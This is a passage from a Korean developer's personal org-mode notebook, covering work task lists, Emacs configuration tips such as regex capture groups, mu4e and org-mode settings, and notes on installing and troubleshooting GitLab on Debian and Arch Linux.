        - <span class="section-num">3.337.1</span> [submodule 추가하기](#submodule-추가하기)
        - <span class="section-num">3.337.2</span> [서브 모듈이 있는 프로젝트 clone 하기](#서브-모듈이-있는-프로젝트-clone-하기)
        - <span class="section-num">3.337.3</span> [submodule 삭제](#submodule-삭제)
        - <span class="section-num">3.337.4</span> [관련 링크](#관련-링크)
    - <span class="section-num">3.338</span> [disqus  추가하기](#disqus-추가하기)
        - <span class="section-num">3.338.1</span> [관련 링크](#관련-링크)
    - <span class="section-num">3.339</span> [pipenv](#pipenv)
    - <span class="section-num">3.340</span> [emacs, nikola 이용 블로깅](#emacs-nikola-이용-블로깅)
        - <span class="section-num">3.340.1</span> [nikola 설치](#nikola-설치)
        - <span class="section-num">3.340.2</span> [initialize a site](#initialize-a-site)
        - <span class="section-num">3.340.3</span> [사이트 빌드](#사이트-빌드)
        - <span class="section-num">3.340.4</span> [글쓰기](#글쓰기)
        - <span class="section-num">3.340.5</span> [github deploy](#github-deploy)
        - <span class="section-num">3.340.6</span> [prodigy 와 연동하기](#prodigy-와-연동하기)
        - <span class="section-num">3.340.7</span> [관련 링크](#관련-링크)
    - <span class="section-num">3.341</span> [homebrew 설치하기](#homebrew-설치하기)
        - <span class="section-num">3.341.1</span> [관련 링크](#관련-링크)
- <span class="section-num">4</span> [WorkLog](#worklog)
    - <span class="section-num">4.1</span> [<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-02-02 금 18:48&gt;</span></span>](#)

</div>
<!--endtoc-->



## <span class="section-num">1</span> Tasks {#tasks}



### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.1</span> 구글 repo 사용법 정리 {#구글-repo-사용법-정리}


### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.2</span> QT 프로그래밍 정리 {#qt-프로그래밍-정리}


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.3</span> mu4e 설정 정리 {#mu4e-설정-정리}


### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.4</span> shell programming background proccess 제어 정리 {#shell-programming-background-proccess-제어-정리}


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.5</span> imx6 reboot 명령이 안먹는 문제 {#imx6-reboot-명령이-안먹는-문제}

커널 4.9 버전부터 systemd가 기본 포함되면서 해결됨. 그 전 버전은채병철 소장 패치를 적용해야함.  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.6</span> I.MX6 안드로이드 Nougat 포팅 이슈 <code>[2/2]</code> {#i-dot-mx6-안드로이드-nougat-포팅-이슈}

1.  [X] 사운드 버그  
    7.1.2 버전에서 sgtl5000이 동작하지 않아 7.1.1 버전으로 다운그레이드
2.  [X] 백라이트 뒤집힘디바이스 트리에서 순서를 뒤집음


### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.7</span> imx7D 관련 문서 정리. cortexM4 개발 관련 설정등 {#imx7d-관련-문서-정리-dot-cortexm4-개발-관련-설정등}


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.8</span> drv console rootfs 정리 <code>[3/3]</code> {#drv-console-rootfs-정리}

-   [X] password 설정
-   [X] ssh login key 설정
-   [X] unit test 설정


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.9</span> drv\_console 메뉴얼 만들기 {#drv-console-메뉴얼-만들기}


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.10</span> drv\_console 보드 업데이트 구성 <code>[6/6]</code> {#drv-console-보드-업데이트-구성}

1.  [X] cloud 서버 구성하기  
    -   amazon aws s3 정적 호스팅 구성함
2.  [X] 업데이트 정의 xml 작성
3.  [X] 업데이트 client 프로그램 작성
4.  [X] 주기적으로 실행 할 수 있도록 서비스 구성
5.  [X] 테스트및 버그 픽스
6.  [X] 업데이트 메뉴얼 만들기


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.11</span> imx new bsp 빌드및 테스트 {#imx-new-bsp-빌드및-테스트}

YOCTO BSP 4.14.78-1.0.0 빌드  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.12</span> UUU(Universal Update Utility) 정리 {#uuu--universal-update-utility--정리}

NXP new update 툴 uuu 사용법 정리  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.13</span> OPTEE 관련 정리하기 {#optee-관련-정리하기}


### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.14</span> amazon aws 파악하기 <code>[0/1]</code> {#amazon-aws-파악하기}

-   [ ] rambda 파악하기


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.15</span> 노트북 구입 {#노트북-구입}

한성 노트북 TFG155 구입. 램 16G M.2 NVME 512 추가  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.16</span> conky 설정 {#conky-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-16 화 10:32&gt;</span></span>  


### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.17</span> stressapptest 오류 해결하기 {#stressapptest-오류-해결하기}


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.18</span> mu4e 메일 send smtp daum으로 변경하기 {#mu4e-메일-send-smtp-daum으로-변경하기}


### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.19</span> AWS 관련 서적 정리하고 반납하기 {#aws-관련-서적-정리하고-반납하기}


### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.20</span> ssh host key check 관련 정리하기 {#ssh-host-key-check-관련-정리하기}


### <span class="org-todo done DONE">DONE</span> <span class="section-num">1.21</span> 회사 사직 <code>[5/5]</code> {#회사-사직}

-   [X] 사직서 제출
-   [X] 교량 보드 펌웨어 릴리즈 <code>[2/2]</code>  
    -   [X] 교량 메인
    -   [X] 교량 오디오 보드
-   [X] 개발 컴퓨터 작업 내용 정리 <code>[3/3]</code>  
    -   [X] 프로젝트별로 디렉토리 정리
    -   [X] 주요 내용 백업
    -   [X] 개인적인 파일 지우기 <code>[3/3]</code>  
        -   [X] 인터넷 사이트 패스워드
        -   [X] 하드에 저장된 개인 패스워드
        -   [X] Dropbox, Telegram, Kakaotalk
-   [X] 백업 컴퓨터 작업 내용 정리
-   [X] 가져갈 개인 물품들 정리하기


### <span class="org-todo todo TODO">TODO</span> <span class="section-num">1.22</span> github page {#github-page}

jekyll 사용  
<https://jekyllrb.com>  
<https://pages.github.com>  


## <span class="section-num">2</span> Emacs {#emacs}



### <span class="org-todo done CANCELED">CANCELED</span> <span class="section-num">2.1</span> apt 모드 프래그램 만들기 {#apt-모드-프래그램-만들기}


### <span class="org-todo done DEFERRED">DEFERRED</span> <span class="section-num">2.2</span> org-mode에서 매일 변경된 부분만 따로 보는 방법 찾기 {#org-mode에서-매일-변경된-부분만-따로-보는-방법-찾기}

Agenda View에서  C-c a L 키를 누르면 타임라인 view 보기가 된다.  
허나 각각의 변경 사항에 대하여 일일이 타임스탬프를 입력해야 한다.  
그렇지 않으면 버전 관리를 해서 체크인 아웃을 하는 방법이 있는데이건 소스 코드가 아니므로 보기에 불편하다.  
org-capture 에 의해서 입력되는 사항에 대해서는 timestamp 가 자동입력되도록 했으므로 무관하나  개별적으로 변경하는 파일에 대해서는신경써서 타임스탬프를 입력하는 방법밖에 없다.  
특정 레벨까지는 타임스탬프를 자동으로 입력하는 방법을 찾아 보아야하겠다.  
logstate 변경에 따라 active timestamp 를 자동 입력하게 하였으나이전 timestamp 에 대하여 inactive 시키는 방법을 찾고 있다.  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">2.3</span> web bookmark 관리 패키지 찾아보기 {#web-bookmark-관리-패키지-찾아보기}

helm 에서 helm-firefox-bookmarks 명령으로 북마크 검색이가능하다.  
firefox 3.0 이상 버전에서는 about:config 에서  
user\_pref("browser.bookmarks.autoExportHTML", true);  
를 설정해야 한다.  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">2.4</span> dot emacs에 있는 package 관련 주석 따로 정리하기 {#dot-emacs에-있는-package-관련-주석-따로-정리하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2014-12-25 목 15:18&gt;</span></span>  
참조하기 편하게 .emacs에 그대로 둠  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">2.5</span> emacs 사용법 프로그램 방법론 정리 {#emacs-사용법-프로그램-방법론-정리}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2012-02-16 목 09:23&gt;</span></span>  


#### <span class="section-num">2.5.1</span> C C++ 프로그래밍 {#c-c-plus-plus-프로그래밍}

1.  autoinsert 를 사용하여 소스 파일 생성시 기본 템플릿을 로드 하게 한다.  
    템플릿 디렉토리는 ~/elisp/templates 이다. header2 패키지를 사용할 수도있으나 이 방법이 가장 심플한 것 같다.
2.  소스 파일의 기본 헤드(요약 정보)를 doxymacs 패키지의 커멘트 입력 명령으로작성할 수 있다.(C-c d i)
3.  함수의 설명이나 주석을 doxymacs의 커멘트 입력 명령(C-c d f)으로 작성할 수 있다.  
    또는 doc-mode의 커멘트 입력 명령(C-c C-d i)를 사용할 수 있다. 그밖에  
    make-box-comment, line-comment-banner 등의 주석 명령이 있다.
4.  코드 작성 중에는 auto-complete 와 yasnippet의 코드 완성 기능을이용할 수 있다.  
    C-i 나 tab 키를 사용하여 auto-complete를 호출 할 수 있다. auto-start  
    옵션을 사용하니 yasnippet과 충돌하여 tab 키 사용시 드랍다운 메뉴에서  
    C-n C-p 키가 안먹는 문제가 있어 메뉴얼로 호출하도록 수정하였다.  
    또 msf-abbrev의 약어 기능을 이용하여 코드 완성 기능을 사용할 수 있는데옛날 패키지라 버그가 좀 있다.


#### <span class="section-num">2.5.2</span> java, python &#x2026; 다른 랭귀지는 차후 업그레이드 예정 {#java-python-and-x2026-다른-랭귀지는-차후-업그레이드-예정}


### <span class="section-num">2.6</span> org-mode 설정 변경 {#org-mode-설정-변경}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2014-12-28 일 21:29&gt;</span></span>  
org-mode 설정을 여럿으로 나누어진 파일에서 단일 파일로 통합하였다.  
변경의 이유는 단순함으로 돌아가자이다. 할일과 기억노트들은바로바로 캡쳐하여 저장하고 오래된 내용들은 archive 하여 최대한가볍고 단순하게 유지하도록 할려고 한다. 지난 내용을 검색으로불러올 수 있으면 그만인 것이다.  


### <span class="org-todo done DEFERRED">DEFERRED</span> <span class="section-num">2.7</span> 원격 접속해제후 /dev/null 파일이 일반 파일로 바뀌는 문제 {#원격-접속해제후-dev-null-파일이-일반-파일로-바뀌는-문제}


#### <span class="section-num">2.7.1</span> tramp 가 HISTFILE=/dev/null로 셋팅해서라는 글 {#tramp-가-histfile-dev-null로-셋팅해서라는-글}

<http://serverfault.com/questions/551628/dev-null-file-became-regular-file>  
<http://lists.gnu.org/archive/html/bug-gnu-emacs/2015-01/msg00986.html>  
해결책은 zsh을 이나 dash를 사용하라는 것.  
$HISTFILE을 셋팅하지 말라는 것다른 방법은 없나?  
tramp 에서 해결해야 할 것 같은데.  


### <span class="org-todo done DEFERRED">DEFERRED</span> <span class="section-num">2.8</span> 원격 접속시 emacsclient가 display를 다른 화면으로 보냄 {#원격-접속시-emacsclient가-display를-다른-화면으로-보냄}


### <span class="section-num">2.9</span> remove hook {#remove-hook}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-01-21 수 14:21&gt;</span></span>  
add-hook 으로 특정 모드의 환경을 구성했는데 이를 제거할필요가 있을 때가 있다.  

```text
(remove-hook 'html-mode-hook 'xah-html-mode-keys)
```

<http://ergoemacs.org/emacs/emacs%5Favoid%5Flambda%5Fin%5Fhook.html>  


### <span class="section-num">2.10</span> unicode 문자 찾기 {#unicode-문자-찾기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-02-08 일 16:44&gt;</span></span>  
찾기에서 unicode 문자를 16진수로 찾아야 할 경우가 있다.  
이럴때는 C-s 다음에 C-q 키를 누르고 유니코드 문자에 맞는  
16진수를 입력하면 된다.  
이멕스는 8진수를 기본으로 입력받으니 변경하려면 아래변수를 설정한다.  

```text
(setq read-quoted-char-radix 16) 
```

<http://blog.gleitzman.com/post/35416335505/hunting-for-unicode-in-emacs>  

unicode 를 숫자로 입력하기 위해서는 C-x 8 enter 를 사용한다.  


### <span class="section-num">2.11</span> emacs shell 에서 ps 명령어 주의사항 {#emacs-shell-에서-ps-명령어-주의사항}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-17 금 17:44&gt;</span></span>  
emacs shell 에서 ps aux 명령어 사용시 칼럼수를 80 정도로 했을 때라인이 넘어가는 부분은 잘린다. 그런데 이것을 ps aux|grep xxx  
와 같이 파이프로 걸러 낼 때 터미널 과 같지 않게 잘린 부분이넘어 가지 않는다는 것에 주의해야 한다.  화면이 잘리지 않게 화면을최대한 키우면 되긴 한다.  
해결책을 찾았다.  

```text
$ ps auxw | grep cmd
```

w 옵션을 더하면 된다. 메뉴얼에는 w 옵션에 대해 이렇게 설명한다.  
Wide output.  Use this option twice for unlimited width.  
사실 lsof 명령으로도 확인 할 수 있으나 너무 느리고  
pgrep -l 명령은 대소문자 구별없음 옵션이 없다.  


### <span class="section-num">2.12</span> shell command 현재 버퍼에 삽입하기 {#shell-command-현재-버퍼에-삽입하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-30 목 14:51&gt;</span></span>  
M-! 명령은 shell 명령 결과를 \*Shell Command Output\* 이라는버퍼을 생성하여 보여준다.  

```text
C-u M-!
```

C-u 프리픽스를 사용하면 명령을 현재 버퍼에 삽입할 수 있다.  


### <span class="section-num">2.13</span> 현재 파일의 변경사항 보기 {#현재-파일의-변경사항-보기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-05 토 15:33&gt;</span></span>  
파일을 편집하다 원본과 현재 변경된 부분과의 차이를 알고 싶을 때가있다. 물론 버전 관리를 하고 있었으면 저장을 해버리고 이전 버전과의차이를 비교하면 되지만 버전 관리 대상이 아닌 파일이거나 저장을하지 않고 현재 변경된 파일과 변경을 시작하기 이전시점과 비교가필요할 때가 있다.  

```text
Alt-x ediff-current-file
```


### <span class="section-num">2.14</span> query-replace-regexp {#query-replace-regexp}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-02-21 일 22:33&gt;</span></span>  


#### <span class="section-num">2.14.1</span> capture 그룹 사용하기 {#capture-그룹-사용하기}

emacs 에서 찾아서 변경하기 작업을 할 때 capture 그룹을 사용할 수 있다.  

```text
#define SABRESD_EPDC_SDDO_0	IMX_GPIO_NR(2, 22)
#define SABRESD_EPDC_SDDO_1	IMX_GPIO_NR(3, 10)
#define SABRESD_EPDC_SDDO_2	IMX_GPIO_NR(3, 12)
#define SABRESD_EPDC_SDDO_3	IMX_GPIO_NR(3, 11)
#define SABRESD_EPDC_SDDO_4	IMX_GPIO_NR(2, 27)
#define SABRESD_EPDC_SDDO_5	IMX_GPIO_NR(2, 30)
```

위에서 SDDO 를 SDCE로 변경하고 \_ 뒤에 숫자는 유지하면서 G  
PIO\_NR 는 (5, 1)과 같이 앞에 숫자는 5로 변경하고 뒤에 숫자는  
\_ 뒤에 있는 숫자와 같이 변경하려면 capture 그룹을 사용하여 한번에변경이 가능하다.  
캡쳐 그룹을 사용하려면 찾기에서 괄호를 사용하여야 하고바꾸기에서 1번부터 괄호를 사용한 순서대로 참조할 수 있다.  
캡쳐그룹 괄호 사용시는 \\(word\\)와 같이 백슬러쉬를 사용해 주어야 한다.  
저장한 그룹은 \\1 \\2 순서로 참조할 수 있다.  

```text
M-x query-replace-regexp enter
\(.*EPDC_\)SDDO_\([0-9]\)\(.*_NR(\)[0-9], [0-9][0-9]) enter
\1SDCE_\2\35, \2) enter
```

```text
#define SABRESD_EPDC_SDCE_0	IMX_GPIO_NR(5, 0)
#define SABRESD_EPDC_SDCE_1	IMX_GPIO_NR(5, 1)
#define SABRESD_EPDC_SDCE_2	IMX_GPIO_NR(5, 2)
#define SABRESD_EPDC_SDCE_3	IMX_GPIO_NR(5, 3)
#define SABRESD_EPDC_SDCE_4	IMX_GPIO_NR(5, 4)
#define SABRESD_EPDC_SDCE_5	IMX_GPIO_NR(5, 5)
```

재사용해야할 부분을 빠르게 파악하여 캡쳐 그룹으로 지정하고이를 분배하여 regex 식을 얼마나 빠르고 정확하게 만드냐가 중요하다.  
마법같이 변경이 되지만 regex 식을 보면 암호문자 같다.  
오히려 regex 식 만들다가 수작업하는 시간보다 더 오래 걸릴 수 있다.  

<https://www.emacswiki.org/emacs/RegularExpression>  


#### <span class="section-num">2.14.2</span> 산술연산 사용하기 {#산술연산-사용하기}

캡쳐한 숫자를 그대로 사용하지 않고 가공하여야 할 때도 있다.  
이럴경우 \\, 를 사용하여 lisp expression을 입력할 수 있다.  
위의 마지막 숫자에 1을 더하는 예제이다.  
\\, 다음에 lisp 식에서 캡쳐 그룹을 \\#2 식으로 표현하여야 한다.  

```text
M-x query-replace-regexp enter
\(.*(5, \)\([0-9]\) enter
\1\,(+ 1 \#2) enter
```

```text
#define SABRESD_EPDC_SDCE_0	IMX_GPIO_NR(5, 1)
#define SABRESD_EPDC_SDCE_1	IMX_GPIO_NR(5, 2)
#define SABRESD_EPDC_SDCE_2	IMX_GPIO_NR(5, 3)
#define SABRESD_EPDC_SDCE_3	IMX_GPIO_NR(5, 4)
#define SABRESD_EPDC_SDCE_4	IMX_GPIO_NR(5, 5)
#define SABRESD_EPDC_SDCE_5	IMX_GPIO_NR(5, 6)
```

<http://unix.stackexchange.com/questions/47615/emacs-simple-arithmetics-in-query-replace>  


### <span class="section-num">2.15</span> find-grep {#find-grep}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-03-09 수 12:40&gt;</span></span>  
or 옵션을 주고 복수의 단어를 검색할 경우 괄호를 사용해야 한다.  

```text
find . -type f \( -name "*.java" -o -name "*.xml" \) -exec grep --color -nH -e screen_timeout {} +
```


### <span class="section-num">2.16</span> Emacs shell ioctl error {#emacs-shell-ioctl-error}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-06-06 월 03:29&gt;</span></span>  
emacs shell 에서 echo $PATH  명령시 아래 에러 발생  

```text
bash: cannot set terminal process group (-1): Inappropriate ioctl for
device
```

env-var-import 패키지에서 shell 실행시 -i 옵션을 사용해서이다.  
(defvar env-var-import-shell-format-str "$SHELL -i -c 'printf  
\\"%s\\"'")  
-i 옵션 제거 하고 해결됨.  


### <span class="section-num">2.17</span> nonascii char 찾기 {#nonascii-char-찾기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-06-10 금 11:26&gt;</span></span>  
regex search 에서 nonascii class 지정  

```text
C-M-s [[:nonascii:]]
```

<https://www.emacswiki.org/emacs/FindingNonAsciiCharacters>  


### <span class="section-num">2.18</span> delete blank line {#delete-blank-line}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-07-29 금 13:44&gt;</span></span>  

-   공백 라인 삭제  
    
    ```text
    M-x flush-lines RET ^$ RET
    ```
-   white space 까지 포함된 공백 라인 삭제  
    
    ```text
    M-x flush-lines RET ^\s-*$ RET
    ```


### <span class="section-num">2.19</span> bbdb mu4e {#bbdb-mu4e}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-04-11 화 12:38&gt;</span></span>  
mu4e 에서 bbdb 를 사용할 수 있다.  

1.  sender mail bbdb 에 추가하기  
    
    ```text
    C-u :
    ```
2.  complete address  
    
    ```text
    tab
    ```
3.  complete mail-alias  
    
    ```text
    C-j, enter
    ```

<http://www.djcbsoftware.nl/code/mu/mu4e/BBDB.html#BBDB>  


### <span class="section-num">2.20</span> org mode attach {#org-mode-attach}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-05-22 월 10:56&gt;</span></span>  

1.  file attch  
    
    ```text
    C-c C-a a
    ```
2.  open attachment  
    
    ```text
    C-c C-a o
    ```


### <span class="section-num">2.21</span> hard link {#hard-link}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-05-23 화 14:36&gt;</span></span>  
이멕스에서 hard link 된 파일을 편집하면 링크가 깨어진다.  
bakup file 을 생성하는 기본 동작을 수정함으로써 링크를 보존할 수 있다.  

```text
(setq backup-by-copying t)
```

오직 하드링크된 파일에 대해서만 적용하길 원한다면  

```text
(setq backup-by-copying-when-linked t)
```


#### <span class="section-num">2.21.1</span> 링크 {#링크}

[stackexchange](https://emacs.stackexchange.com/questions/4237/how-to-prevent-emacs-from-breaking-hard-links)  


### <span class="section-num">2.22</span> Org html export theme 사용하기 {#org-html-export-theme-사용하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-17 월 20:22&gt;</span></span>  


#### <span class="section-num">2.22.1</span> 사용법 {#사용법}

1.  아래 링크에서 파일을 받은후 org 파일에 아래 삽입  
    
    ```text
    #+SETUPFILE: /home/ybgwon/Dropbox/Emacs/Org/org-html-themes/setup/theme-readtheorg-local.setup
    ```
2.  org 파일이 있는 디렉토리에 style 복사  
    
    ```text
    $ cp -r ~/Dropbox/Emacs/Org/org-html-themes/styles .
    ```


#### <span class="section-num">2.22.2</span> 링크 {#링크}

<https://github.com/fniessen/org-html-themes>  


### <span class="section-num">2.23</span> emacs is evil {#emacs-is-evil}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-07 월 13:21&gt;</span></span>  
emacs 는 악마다.  


### <span class="section-num">2.24</span> check current encoding system {#check-current-encoding-system}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-09-04 월 12:13&gt;</span></span>  
Alt + x describe variable -> buffer-file-coding-system  
<http://ergoemacs.org/emacs/emacs%5Fencoding%5Fdecoding%5Ffaq.html>  


### <span class="section-num">2.25</span> easypg no secret key error {#easypg-no-secret-key-error}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-10-24 화 13:14&gt;</span></span>  
갑자기 메일 이나 파일 에서 encrypt, decrypt 가 안되는 현상 발생아래와 같이 조치  

1.  pinentry-gnome3 패키지를 제거 하고 pinentry-curses 설치
2.  gpg1 을 gpg2 로 링크  
    
    ```text
    $ cd /usr/bin
    $ sudo mv gpg2 gpg2.bak
    $ sudo ln -s gpg gpg2
    ```


### <span class="section-num">2.26</span> Elpy python 버전 변경하기 {#elpy-python-버전-변경하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-12-25 월 17:54&gt;</span></span>  

```text
(setq elpy-rpc-python-command "python3")
(setq python-shell-interpreter "ipython3")
```


#### <span class="section-num">2.26.1</span> 참조 {#참조}

<https://github.com/jorgenschaefer/elpy/issues/979>  


### <span class="section-num">2.27</span> calc mode {#calc-mode}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-18 월 13:26&gt;</span></span>  

1.  진수 변환  
    d [268]  
    d 다음에 표시하고자 하는 진수를 입력한다.  
    1.  2진수로 보기  
        
        ```text
        d 2
        ```
    2.  16진수로 보기  
        
        ```text
        d 16
        ```
2.  앞에 0 표시  
    d z  
    
    ```text
    2#00000000000000010111000001011001
    ```
3.  그룹단위로 표시  
    d g  
    
    ```text
    2#0000,0000,0000,0001,0111,0000,0101,1001
    ```
4.  word size 변경  
    b w 8 - 8bit 로 변경  
    
    ```text
    2#1,0111,0000,0101,1001
    ```
5.  quick calc mode  
    C-x \* q

<http://tonyballantyne.com/tech/calc-mode-2-twos-complement/>  


### <span class="section-num">2.28</span> org mode 에서 강제 newline 삽입하기 {#org-mode-에서-강제-newline-삽입하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-01-04 금 16:43&gt;</span></span>  
\\\\ 를 라인 끝에 삽입하거나 파일 처음에 다음을 추가한다.  

```text
#+OPTIONS: \n:t
```

[stackexchange](https://emacs.stackexchange.com/questions/21556/org-mode-export-how-to-force-newline-on-lines-between-paragraphs)  


### <span class="section-num">2.29</span> org mode 에서 inline image 사용하기 {#org-mode-에서-inline-image-사용하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-01-04 금 16:47&gt;</span></span>  


#### <span class="section-num">2.29.1</span> 모든 파일에 적용하기 {#모든-파일에-적용하기}

dot emacs 파일에 아래 추가  

```text
(setq org-startup-with-inline-images t)
```


#### <span class="section-num">2.29.2</span> 특정 파일에 적용하기 {#특정-파일에-적용하기}

org 파일의 처음에 아래 추가  

```text
#+STARTUP: inlineimages
```


#### <span class="section-num">2.29.3</span> 실시간으로 on off {#실시간으로-on-off}

```text
M-x org-toggle-inline-images (bound to C-c C-x C-v)
```

[stackoverflow](https://stackoverflow.com/questions/27129338/inline-images-in-org-mode)  
[stackexchange](https://emacs.stackexchange.com/questions/35030/render-image-in-org-file-after-creating-its-link)  


### <span class="section-num">2.30</span> mu4e {#mu4e}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-02-15 금 18:14&gt;</span></span>  
메일 검색용 mu utils 를 기반으로 한 emacs 용 메일 패키지이다.  
gnus등 다른 메일 프로그램과 차별화 된 점은 빠른 검색에 있다.  
mu4e는 mail 가져오기와 보내기 프로그램을 따로 사용한다.  


#### <span class="section-num">2.30.1</span> 가져오기 {#가져오기}

가져오기에는 offlineimap 을 사용하였고주기적으로 실행하기 위해서 systemd timer 를 사용하였다.  


#### <span class="section-num">2.30.2</span> 보내기 {#보내기}

smtpmail-send-it 을 사용하였다.  


#### <span class="section-num">2.30.3</span> 관련 패키지 {#관련-패키지}

1.   알림 - mu4e-alert

2.   인용 - mu-cite

3.   파일첨부 - mu4e-dired

    dired 모드에서 m key로 파일을 선택한 후 C-c RET C-a  
    키를 누르면 메일 쓰기에 자동 첨부된다.  

4.   schedule - mu4e-send-delay

    메일을 바로 보내지 않고 /Drafts 폴더에 이동한 후 설정값(기본 3분)후에메일을 보내도록 한다.  
    따라서 설정 시간 안에는 메일 보내기를 취소 하고 다시 작성할 수 있다.  
    C-c C-d 키로 메일 보내기를 연기할 수 도 있는데 이때도 /Drafts 폴더에파일이 보내진다. 하지만 이 파일은 schedule 되지 않아서따로 보내기 명령을 내려야 메일 보내기가 된다.  
    만일 뭔가 잘못되었음을 감지했다면 Drafts 폴더로 이동한 다음  
    E 키를 누르고 수정하기나 D 키를 누르고 삭제할 수 있다.  
    파일을 수정하는 동안에는 스케쥴이 동작하지 않는다.  
    만일 mu4e-send-delay 를 사용하면서 즉시 메일을 보내기를 원한다면  
    M-x message-send-exit  
    명령을 사용하자.  


## <span class="section-num">3</span> Linux {#linux}



### <span class="org-todo done DEFERRED">DEFERRED</span> <span class="section-num">3.1</span> gitlab timeout 발생하고 느려지는 문제 해결하기 {#gitlab-timeout-발생하고-느려지는-문제-해결하기}

charts 링크를 억세스 할때만 timeout 이 발생하나 원인을 찾지 못했다.  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.2</span> GitLab 설치하기 {#gitlab-설치하기}


#### <span class="section-num">3.2.1</span> OMNIBUS PACKAGE 설치 {#omnibus-package-설치}

GitLab 에서는 omnibus package 설치를 권장한다.  
다음은 debian system 일때 설치하는 방법이다.  

```text
$ wget https://downloads-packages.s3.amazonaws.com/debian-7.7/gitlab_7.6.1-omnibus.5.3.0.ci.1-1_amd64.deb
$ sudo apt-get install openssh-server
$ sudo apt-get install postfix # Select 'Internet Site', using sendmail instead also works, exim has problems
$ sudo dpkg -i gitlab_7.6.1-omnibus.5.3.0.ci.1-1_amd64.deb
```

패키지 설치후 설정하기  

```text
$ sudo gitlab-ctl reconfigure
Browse to the hostname and login
Username: root
Password: 5iveL!fe 
```

1.  <span class="org-todo done CLOSED">CLOSED</span>  메일 설정

    GitLab 권장대로 postfix 를 설치하였으나 smarthost 로 gmail smtp를설정하였으나 동작하지 않았고 GitLab 자체에 있는 smtp 설정도사용해 보았으나 동작하지 않아 msmtp 를 설치하고 해결.  
    postfix나 GitLab 의 설정 문제인지 google smtp의 보안 설정에 문제가있었는지 확인하지 못함. archlinux 에서는 postfix google smarthost  
    설정이 제대로 동작하는 걸로 보아 google  smtp 보안 설정을낮은 수준으로 변경하는 과정에서 에러가 난 듯 함.  


#### <span class="section-num">3.2.2</span> CUSTOM 설치 {#custom-설치}

1.  <span class="org-todo done CLOSED">CLOSED</span>  페이지 로딩이 느린 현상

    설치후 페이지당 로딩하는 시간이 1분여 걸릴 정도로 느리다.  
    현재 의심가는 부분  
    
    1.  시스템에 mysql 과 postgres 가 함께 설치되어 있어설치시 warning 메시지가 있었다.
    2.  ruby 버전이 최적화 버전인지 확인하기
    3.  redis 에서 커널 관련 설정 메시지를 보았다.
    
    1.   해결
    
        위는 모두 헛다리. 대부분 archlinux 포팅 과정에서 주소 부분이안 맞거나 버그 때문.  
        
        1.  secret 파일이 일치 하지 않음  
            /usr/share/webapps/gitlab/{.gitlab\_shell\_secret,.secret}  
            /usr/share/webapps/gitlab-shell/.gitlab\_shell\_secret  
            /etc/webapps/gitlab/secret  
            /etc/webapps/gitlab-shell/secret  
            이 파일들이 모두 같도록 하나의 파일을 복사한다.
        2.  /etc/redis.conf 에서 unixsocket 통신을 할 수 있도록 추가한다.  
            unixsocket /run/redis/redis.sock  
            unixsocketperm 770
        3.  /etc/webapps/gitlab/unicorn.rb의 unix sock 주소를 시스템에맞게 변경한다.  
            listen "/run/gitlab/gitlab.socket", :backlog => 1024
        4.  /etc/nginx/sites-available/gitlab 파일의 upstream 주소 변경  
            server unix:/run/gitlab/gitlab.socket fail\_timeout=0;
        5.  gitlab 사이트 manual 설치 설명에 있는 부분 추가  
            sudo -u gitlab -H cp config/initializers/rack\_attack.rb.example  
            config/initializers/rack\_attack.rb  
            sudo -u git -H cp config/resque.yml.example config/resque.yml
        6.  resque.yml 에서 redis 주소 변경  
            production: unix:///run/redis/redis.sock

2.   설치 정리

    archlinux 에서 설치한 부분을 정리하였다. 먼저 debian이나 redhat 계열이아니면 omnibus package 가 지원되지 않으므로 manual 설치 하여야 하는데  
    gitlab manual 설치 설명서는 debian 기준이다. gitlab의 설명서대로설치하자면 archlinux에서는 systemd를 사용하기 때문에 init 관련 script  
